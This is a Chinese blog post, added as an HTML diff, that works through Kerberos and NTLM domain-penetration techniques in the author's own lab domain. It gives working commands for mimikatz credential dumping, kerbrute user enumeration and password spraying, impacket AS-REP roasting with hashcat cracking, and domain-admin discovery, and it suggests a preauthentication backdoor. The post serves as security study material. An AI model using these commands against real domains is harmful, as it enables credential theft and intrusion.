@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0\/",
+  "keywords":"[kerberos]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="kerberos">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kerberos域渗透学习（一）">
+<meta name="twitter:title" content="kerberos域渗透学习（一）">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-09-01T20:40:45">
+  
+  
+    <meta property="article:modified_time" content="2023-09-01T20:40:45">
+  
+  
+  
+    
+      <meta property="article:section" content="渗透">
+    
+  
+  
+    
+      <meta property="article:tag" content="渗透">
+    
+      <meta property="article:tag" content="域">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/15.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/15.jpeg">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/14.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/14.jpeg">
+
+
+    <title>kerberos域渗透学习（一）</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/15.jpeg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      kerberos域渗透学习（一）
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-09-01T20:40:45&#43;08:00">
+        
+  九月 1, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/%e6%b8%97%e9%80%8f">渗透</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#参考链接">参考链接</a></li>
+    <li><a href="#windows认证">Windows认证</a></li>
+    <li><a href="#本地认证">本地认证</a></li>
+    <li><a href="#网络认证">网络认证</a></li>
+    <li><a href="#域环境搭建">域环境搭建</a></li>
+    <li><a href="#如何发现域">如何发现域</a></li>
+    <li><a href="#域认证kerberos">域认证（kerberos）</a>
+      <ul>
+        <li><a href="#kerberos概念">kerberos概念</a></li>
+        <li><a href="#域认证所参与的角色">域认证所参与的角色</a></li>
+        <li><a href="#kerberos认证协议">kerberos认证协议</a>
+          <ul>
+            <li><a href="#tgtticket-granting-ticket">TGT（Ticket Granting Ticket）</a></li>
+          </ul>
+        </li>
+        <li><a href="#票据server-ticketticket">票据（Server Ticket/Ticket）</a></li>
+        <li><a href="#kdckey-distribution-center">KDC(Key Distribution Center)</a></li>
+        <li><a href="#adaccount-database">AD(Account Database)</a></li>
+        <li><a href="#域认证流程">域认证流程</a>
+          <ul>
+            <li><a href="#粗略流程">粗略流程</a></li>
+            <li><a href="#详细流程">详细流程</a></li>
+          </ul>
+        </li>
+        <li><a href="#域用户枚举">域用户枚举</a>
+          <ul>
+            <li><a href="#概述">概述</a></li>
+            <li><a href="#利用">利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#as-reproasting">AS-REPRoasting</a>
+          <ul>
+            <li><a href="#概述-1">概述</a></li>
+            <li><a href="#利用-1">利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#password-spraying密码喷洒">Password Spraying（密码喷洒）</a>
+          <ul>
+            <li><a href="#概述-2">概述</a></li>
+            <li><a href="#利用-2">利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#如何定位域管">如何定位域管</a>
+          <ul>
+            <li><a href="#概述-3">概述</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#委派">委派</a>
+      <ul>
+        <li><a href="#非约束委派">非约束委派</a>
+          <ul>
+            <li><a href="#概念">概念</a></li>
+            <li><a href="#机器用户设置委派">机器用户设置委派</a></li>
+            <li><a href="#查找">查找</a></li>
+            <li><a href="#利用场景">利用场景</a></li>
+            <li><a href="#主动">主动</a></li>
+          </ul>
+        </li>
+        <li><a href="#约束委派">约束委派</a>
+          <ul>
+            <li><a href="#概述-4">概述</a></li>
+            <li><a href="#配置">配置</a></li>
+            <li><a href="#查找-1">查找</a></li>
+          </ul>
+        </li>
+        <li><a href="#利用-3">利用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</a></p>
+<p><a href="https://xz.aliyun.com/t/10189">https://xz.aliyun.com/t/10189</a></p>
+<p><a href="https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/">https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/</a></p>
+<p><a href="https://www.cnblogs.com/first-kiss/p/16212857.html">内网域渗透之委派攻击 - 空于野 - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://blog.thekingofduck.com/post/ADStudy-Part-4-Kerbroes-Study/">https://blog.thekingofduck.com/post/ADStudy-Part-4-Kerbroes-Study/</a></p>
+<p><a href="https://xz.aliyun.com/t/11555">https://xz.aliyun.com/t/11555</a></p>
+<p><a href="https://xz.aliyun.com/t/10061">https://xz.aliyun.com/t/10061</a></p>
+<p><a href="https://y4er.com/posts/kerberos-unconstrained-delegation/">https://y4er.com/posts/kerberos-unconstrained-delegation/</a></p>
+<h1 id="windows认证">Windows认证</h1>
+<p>域渗透就是基于Windows域环境的渗透</p>
+<p>Windows的认证包括三个部分，用户直接操作计算机登录账户（本地认证），远程连接到工作组中的某个设备（网络认证），登录到域环境中的某个设备（域认证）</p>
+<h1 id="本地认证">本地认证</h1>
+<p>本地认证：用户输入密码，系统收到密码后将用户输入的密码计算成<code>NTLM HASH    </code> ，然后与sam数据库（<code>%SystemRoot%\system32\config\sam</code>）中该用户的哈希比对，匹配则登陆成功，不匹配则登陆失败</p>
+<p>大致运算流程为</p>
+<pre tabindex="0"><code>用户密码-&gt;HEX编码-&gt;Unicode编码-&gt;MD4
+</code></pre><p>用python的passlib库</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> passlib.hash <span style="color:#f92672">import</span> nthash
+</span></span><span style="display:flex;"><span>print(nthash<span style="color:#f92672">.</span>hash(<span style="color:#e6db74">&#39;admin&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#209c6174da490caeb422f3fa5a7ae634</span>
+</span></span></code></pre></div><p>本地认证中用来处理用户输入密码的进程即lsass.exe，密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对</p>
+<p>我们使用mimikatz来获取的明文密码，就是从这个进程中读取到的。</p>
+<p>mimikatz获取密码（要用管理员权限运行）</p>
+<pre tabindex="0"><code>privilege::debug
+sekurlsa::logonPasswords
+</code></pre><h1 id="网络认证">网络认证</h1>
+<p>网络认证即在工作组环境下远程登录另一台电脑所采用的认证机制</p>
+<p>NTLM协议的认证过程分为三步，也叫做挑战相应机制</p>
+<p>1.协商</p>
+<p>2.质询</p>
+<p>3.验证</p>
+<p>协商：双方确定使用的协议版本，<code>NTLM</code>存在<code>V1</code>和<code>V2</code>两个版本，具体区别就是加密方式不同</p>
+<p>质询：挑战（Chalenge）/响应（Response）认证机制的核心</p>
+<p>1.客户端向服务器端发送用户信息(用户名)请求</p>
+<p>2.服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数，被称之为“Challenge”， 然后使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1保存在内存中。同时，生成Challenge1后，将Challenge(16位随机字符)发送给客户端。</p>
+<p>3.客户端接受到Challenge后，使用自己提供的账户的密码转换成对应的NTLM Hash，然后使用这个NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</p>
+<p>验证：在质询完成后，验证结果，是认证的最后一步。</p>
+<p>服务端收到客户端发送的Response后，与之前保存在内存中的Channelge1比较，如果相等认证通过</p>
+<p>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash（不能直接用来进行哈希传递攻击，但可以通过暴力破解来获取明文密码）</p>
+<p>简单的来说：客户端向服务器请求使用某个用户进行验证，服务端判断该用户是否存在，存在的话使用这个用户密码的哈希值来加密一个随机字符串，并且将这个随机字符串返回给客户端，客户端再把自己提供的密码进行哈希处理后也来加密这串随机字符串，然后再把结果发送给服务器，服务器把从客户端发送的加密结果与自己本地的加密结果进行比较，相同的话便通过认证</p>
+<p>其中的关键点在于：第二步中客户端发送的是NTLM哈希值与随机字符串加密的结果，而这个NTLM哈希是由用户输入的密码本地计算得出的，所以在这个步骤中，只要能提供正确的NTLM哈希即使不知道正确的密码也可通过认证</p>
+<p>再举个简单的例子，渗透某个站点，通过sql注入获取到了用户数据库，然后发现数据库中的管理员密码是md5加密的而且无法解开，但是这时候发现在前端登录时，也会将你输入的密码进行md5加密，也就是说后端是对比两个md5值是否相同，那我如果知道密码的md5值就能直接登录了，干嘛还要去解开呢？</p>
+<pre tabindex="0"><code>工作组环境和域环境下Net NTLM认证过程因为有DC（域控制器）的参与流程略有差异，不过不影响我们进行哈希传递攻击
+</code></pre><h1 id="域环境搭建">域环境搭建</h1>
+<p>windows server2016 (192.168.45.144)</p>
+<p>windows10专业版</p>
+<p>windows7</p>
+<p><a href="https://blog.csdn.net/u010091664/article/details/122072506">windows server 2016搭建域控_server2016域控配置_昭哥-HYZ的博客-CSDN博客</a></p>
+<p>这里添加域成员的时候，记得将dns服务器ip设置为域控的ip</p>
+<h1 id="如何发现域">如何发现域</h1>
+<pre tabindex="0"><code>net config workstation
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831103712309.png" alt="image-20230831103712309"></p>
+<p>如果入口点没有在域内，但能通DC的话，fscan一般也能扫出来，可以使用NetBIOS扫描探测</p>
+<pre tabindex="0"><code>fscan64 -np -m netbios -h 192.168.45.1/24
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831104216719.png" alt="image-20230831104216719"></p>
+<h1 id="域认证kerberos">域认证（kerberos）</h1>
+<h2 id="kerberos概念">kerberos概念</h2>
+<p>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为<code>Client / Server</code>应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。</p>
+<h2 id="域认证所参与的角色">域认证所参与的角色</h2>
+<ul>
+<li>访问服务的Client</li>
+<li>提供服务的Server</li>
+<li>KDC（key Distribution Center）密钥分发中心</li>
+</ul>
+<p>其中KDC服务默认会安装在一个域的域控中，而<code>Client</code>和<code>Server</code>为域内的用户或者是服务，如<code>HTTP服务</code>，<code>SQL服务</code>。在<code>Kerberos</code>中<code>Client</code>是否有权限访问<code>Server</code>端的服务由<code>KDC(Key Distribution Center)</code>发放的票据来决定。</p>
+<h2 id="kerberos认证协议">kerberos认证协议</h2>
+<h3 id="tgtticket-granting-ticket">TGT（Ticket Granting Ticket）</h3>
+<pre tabindex="0"><code>由身份认证服务AS(Authentication Service)授予的票据，TGT用于身份认证，存储在内存，默认有效期为10小时，通过TGT能够获得票据（Ticket），TGT是一种 临时凭证 的存在，伪造的TGT又被称为 黄金票据。
+</code></pre><h2 id="票据server-ticketticket">票据（Server Ticket/Ticket）</h2>
+<pre tabindex="0"><code>是网络对象互相访问的 凭证，伪造的ST\Ticket又被称为 白银票据。
+</code></pre><h2 id="kdckey-distribution-center">KDC(Key Distribution Center)</h2>
+<pre tabindex="0"><code>负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：
+</code></pre><ul>
+<li><strong>AS(Authentication Service)</strong>: 身份认证服务，为<code>Client</code>生成<code>TGT(Ticket Granting Ticket)</code>的服务。</li>
+<li><strong>TGS(Ticket Granting Service)</strong>: 票据授予服务，为<code>Client</code>生成某个服务的<code>Ticket</code>的服务。</li>
+</ul>
+<h2 id="adaccount-database">AD(Account Database)</h2>
+<pre tabindex="0"><code>一个类似于本机SAM的一个数据库，存储所有Client的白名单，只有存在于白名单的Client才能顺利申请到TGT。
+</code></pre><p>注：从物理层面看，AD与KDC均为域控制器（Domain Controller）</p>
+<h2 id="域认证流程">域认证流程</h2>
+<h3 id="粗略流程">粗略流程</h3>
+<p>①-②：<code>Client</code>向<code>kerberos</code>服务请求，希望获取访问<code>Server</code>的权限。 <code>kerberos</code>得到了这个消息，首先得判断<code>Client</code>是否是可信赖的， 也就是白名单黑名单的说法。</p>
+<p>这就是<code>AS(Authentication Service)</code>服务完成的工作，通过在<code>AD(Account Database)</code>中存储黑名单和白名单来区分<code>Client</code>。</p>
+<p>成功后，<code>AS(Authentication Service)</code>返回<code>TGT（Ticket Granting Ticket）</code>给<code>Client</code>。</p>
+<p>③-④：<code>Client</code>得到了<code>TGT（Ticket Granting Ticket）</code>后，继续向<code>kerberos</code>请求，希望获取访问 <code>Server</code>的权限。<code>kerberos</code>又得到了这个消息，这时候通过<code>Client </code>消息中的<code>TGT</code>，判断出了<code>Client</code>拥有了这个权限，给了<code>Client</code>访问<code>Server</code>的权限<code>Ticket</code>。</p>
+<p>⑤-⑥：<code>Client</code>得到<code>Ticket</code>后，终于可以成功访问<code>Server</code>。这个<code>Ticket</code>只是 针对这个<code>Server</code>，其他<code>Server</code>需要向<code>TGS(Ticket Granting Service)</code>申请。</p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230830203418201.png" alt="image-20230830203418201"></p>
+<p>还有一个简单易懂的例子：</p>
+<p><a href="https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/">https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/</a></p>
+<h3 id="详细流程">详细流程</h3>
+<pre tabindex="0"><code>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳
+AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。
+TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求
+TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)
+AP_REQ: Client拿着TGS票据去请求服务
+AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。
+</code></pre><h2 id="域用户枚举">域用户枚举</h2>
+<h3 id="概述">概述</h3>
+<p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>，所以当我们没有域凭证时，可以通过<code>Kerberos pre-auth</code>从域外对域用户进行用户枚举。</p>
+<p>简单来说，根据返回包值的不同，来确定是不是又这个用户，和盲注类似</p>
+<h3 id="利用">利用</h3>
+<p>使用工具https://github.com/ropnop/kerbrute</p>
+<p>测试：</p>
+<p>user.txt如下</p>
+<pre tabindex="0"><code>Win7-2023QLEWED
+DESKTOP-OK1CA8G
+test1
+test2
+</code></pre><pre tabindex="0"><code>kerbrute_windows_amd64 userenum --dc 192.168.45.144 -d gkjzjh146.com user.txt
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831111519808.png" alt="image-20230831111519808"></p>
+<h2 id="as-reproasting">AS-REPRoasting</h2>
+<h3 id="概述-1">概述</h3>
+<p>对于域用户，如果设置了选项<code>Do not require Kerberos preauthentication</code>(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用<code>hashcat</code>或是<code>john</code>对其破解，最终获得该用户的明文口令。默认情况下该配置不会设置。</p>
+<h3 id="利用-1">利用</h3>
+<p>配置域用户的不要求Kerberos预身份认证属性：</p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831182250974.png" alt="image-20230831182250974"></p>
+<p>kali有impacket工具包</p>
+<pre tabindex="0"><code>impacket-GetNPUsers -dc-ip 192.168.45.144 gkjzjh146.com/zhangsan:123456
+</code></pre><p>这里用户要对密码随便弄一个</p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831190355230.png" alt="image-20230831190355230"></p>
+<p>复制出来，然后用hashcat直接爆</p>
+<pre tabindex="0"><code>hashcat64 -m 18200 -a 0 hash.txt 1.txt
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831190441254.png" alt="image-20230831190441254"></p>
+<p>没有域凭证时,也可以用户名枚举来查找未设置预认证的账号：</p>
+<pre tabindex="0"><code>impacket-GetNPUsers -dc-ip 192.168.45.144 gkjzjh146.com/ -usersfile users.txt
+</code></pre><p>该配置<code>不要求Kerberos预身份认证</code>默认不启用，可以给域内高权限用户配置该选项作为后门。</p>
+<h2 id="password-spraying密码喷洒">Password Spraying（密码喷洒）</h2>
+<h3 id="概述-2">概述</h3>
+<p>在kerberos的AS-REQ认证中当用户名存在时，密码正确或者错误返回包结果不一样，所以可以尝试爆破密码。</p>
+<h3 id="利用-2">利用</h3>
+<p>通常爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
+<pre tabindex="0"><code>kerbrute_win_amd64 passwordspray --dc 192.168.45.144 -d gkjzjh146.com user.txt zhang3..
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831192301438.png" alt="image-20230831192301438"></p>
+<p>单用户爆破密码：</p>
+<pre tabindex="0"><code>kerbrute_windows_amd64 bruteuser --dc 192.168.45.144 -d gkjzjh146.com password.txt zhangsan
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831193048000.png" alt="image-20230831193048000"></p>
+<p>用户名&amp;密码字典组合爆破，而格式<code>username:password</code>：</p>
+<pre tabindex="0"><code>kerbrute_windows_amd64 bruteforce --dc 192.168.45.144 -d gkjzjh146.com res.txt
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831193329259.png" alt="image-20230831193329259"></p>
+<p>除了通过kerberos爆破，还可以利用smb，ldap爆破。
+smb爆破使用msf<code>auxiliary/scanner/smb/smb_login</code>模块</p>
+<p>还可以用ldap爆破</p>
+<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%9A%E8%BF%87LDAP%E5%8D%8F%E8%AE%AE%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%9A%E8%BF%87LDAP%E5%8D%8F%E8%AE%AE%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4</a></p>
+<h2 id="如何定位域管">如何定位域管</h2>
+<h3 id="概述-3">概述</h3>
+<p>域渗透中定位并拿下域管登陆过的主机，就可以在该主机导出域管密码或是hash：</p>
+<pre tabindex="0"><code>net group &#34;domain admins&#34; /domain
+net group &#34;domain controllers&#34; /domain
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831195902305.png" alt="image-20230831195902305"></p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831195926553.png" alt="image-20230831195926553"></p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831200138456.png" alt="image-20230831200138456"></p>
+<h1 id="委派">委派</h1>
+<p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“ Kerberos双跳问题”，并且要求进行委派，以便Web Server在修改数据库记录时模拟用户。</p>
+<p>简单地说：委派就是将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内其他服务。<strong>将我的权限给服务账户</strong>。</p>
+<p>注意：能够被委派的用户只能是服务账号或者机器账号</p>
+<p>机器账户:活动目录中的computers组内的计算机，也被称为机器账号。</p>
+<p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</p>
+<p>Kerberos委派主要分为三种：</p>
+<ul>
+<li>非约束委派(Unconstrained Delegation)</li>
+<li>约束委派(Constrained Delegation)</li>
+<li>基于资源的约束委派(Resource-Based Constrained Delegation)</li>
+</ul>
+<h2 id="非约束委派">非约束委派</h2>
+<h3 id="概念">概念</h3>
+<p>当域用户访问域内某服务时，如果该服务开启了非约束委派，用户会主动将自己已转发的的TGT发送服务，而该服务会将用户的TGT保存在内存以备下次重用，然后服务就可以利用该已转发的TGT以用户的身份访问该用户能访问的服务。非约束委派的安全问题就是如果我们找到配置了非约束委派的主机，并且通过一定手段拿下该主机的权限，我们就可以拿到所有访问过该主机用户的TGT。</p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831065139367.png" alt="image-20230831065139367"></p>
+<p>例子：</p>
+<p>jack需要登陆到后台文件服务器，经过Kerberos认证的过程如下：</p>
+<ol>
+<li>jack以Kerberos协议认证登录，将凭证发送给websvc</li>
+<li>websvc使用jack的凭证向KDC发起Kerberos申请TGT。</li>
+<li>KDC检查websvc的委派属性，如果websvc可以委派，则返回可转发的jack的TGT。</li>
+<li>websvc收到可转发TGT之后，使用该TGT向KDC申请可以访问后台文件服务器的TGS票据。</li>
+<li>KDC检查websvc的委派属性，如果可以委派，并且权限允许，那么返回jack访问服务的TGS票据。</li>
+<li>websvc使用jack的服务TGS票据请求后台文件服务器。</li>
+</ol>
